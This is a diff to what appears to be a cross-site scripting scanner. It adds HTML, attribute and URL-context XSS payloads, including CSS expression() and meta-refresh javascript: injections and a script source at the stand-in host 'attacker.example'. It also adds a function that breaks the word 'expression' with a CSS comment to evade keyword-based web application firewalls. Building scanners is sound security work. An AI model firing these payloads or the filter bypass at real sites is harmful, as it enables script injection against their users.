@@ -25,6 +25,7 @@ from .waf_detect import (
   EVASION_CASE_MIXING,
   EVASION_CHUNKED_TAGS,
   EVASION_COMMENT_BREAK,
+  EVASION_CSS_EXPR,
   EVASION_DOUBLE_ENCODE,
   EVASION_HTML_ENCODE,
   EVASION_NEWLINE,
@@ -62,6 +63,11 @@ _HTML_BODY_PAYLOADS = [
   "<table background=\"javascript:alert('{marker}')\">",
   "</p><script>alert('{marker}')</script>",
   "<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
+  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{marker}')\">",
+  "<div onmouseover=\"alert('{marker}')\">x</div>",
+  "<body><img src=x onerror=alert('{marker}')></body>",
+  "\n<img src=x onerror=alert('{marker}')>",
+  "\n<script>alert('{marker}')</script>",
 ]
 
 _ATTR_DOUBLE_PAYLOADS = [
@@ -71,6 +77,8 @@ _ATTR_DOUBLE_PAYLOADS = [
   '" onfocus="alert(\'{marker}\')" autofocus="',
   '"><details open ontoggle=alert(\'{marker}\')>',
   '"><script>alert(\'{marker}\')</script>',
+  '" style="expression(alert(\'{marker}\'))" x="',
+  '"><meta http-equiv="refresh" content="0;url=javascript:alert(\'{marker}\')">',
 ]
 
 _ATTR_SINGLE_PAYLOADS = [
@@ -78,6 +86,7 @@ _ATTR_SINGLE_PAYLOADS = [
   "' onmouseover='alert(\"{marker}\")' x='",
   "'><svg onload=alert('{marker}')>",
   "' onfocus='alert(\"{marker}\")' autofocus='",
+  "' style='expression(alert(\"{marker}\"))' x='",
 ]
 
 _ATTR_UNQUOTED_PAYLOADS = [
@@ -132,6 +141,7 @@ _URL_ATTR_PAYLOADS = [
   "javascript&#58;alert('{marker}')",
   "javascript:void(alert('{marker}'))",
   "data:text/html,<script>alert('{marker}')</script>",
+  "//attacker.example/xss.js?{marker}",
 ]
 
 _CSS_PAYLOADS = [
@@ -255,6 +265,8 @@ def _apply_evasion(payload: str, evasion: str) -> List[str]:
       variants.append(_comment_break(payload))
     elif evasion == EVASION_BACKTICK:
       variants.append(_backtick_attr(payload))
+    elif evasion == EVASION_CSS_EXPR:
+      variants.append(_css_expression_break(payload))
   except Exception:
     pass
   return variants
@@ -320,3 +332,12 @@ def _comment_break(s: str) -> str:
 def _backtick_attr(s: str) -> str:
   """Replace attribute quote chars with backticks (IE legacy trick)."""
   return s.replace('"', "`").replace("'", "`")
+
+
+def _css_expression_break(s: str) -> str:
+  """
+  Break the literal word 'expression' with a CSS comment to bypass
+  keyword-based filters (e.g. ex/**/pression).  Works in IE and some
+  older WebKit/Blink engines that support CSS expression().
+  """
+  return re.sub(r"\bexpression\b", "ex/**/pression", s, flags=re.IGNORECASE)
